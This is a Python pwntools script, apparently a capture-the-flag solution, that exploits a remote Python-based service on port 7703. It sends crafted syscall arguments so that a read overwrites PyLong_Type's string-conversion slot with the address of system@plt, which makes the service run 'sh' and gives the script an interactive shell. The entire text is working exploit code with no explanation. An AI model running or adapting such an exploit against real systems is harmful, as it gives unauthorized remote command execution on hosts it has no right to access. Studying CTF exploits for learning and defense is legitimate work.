#!/usr/bin/env python3.7

import sys

from pwn import remote, p64
from time import sleep


system_plt = 0x421080
PyLong_Type = 0xA25940
PyLong_ToString = PyLong_Type + 17 * 8


def main(io):
    count = int.from_bytes(b'sh\x00', 'little') - 38
    syscall_number = 0
    syscall_arguments = [0, PyLong_ToString, 8]
    syscall_arguments += [8] * count
    io.sendlineafter(b': ', str(syscall_number).encode())
    io.sendlineafter(b': ', ' '.join(map(str, syscall_arguments)).encode())
    sleep(1)
    io.send(p64(system_plt))
    io.interactive()


if __name__ == '__main__':
    IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
    PORT = 7703

    with remote(IP, PORT) as io:
        main(io)
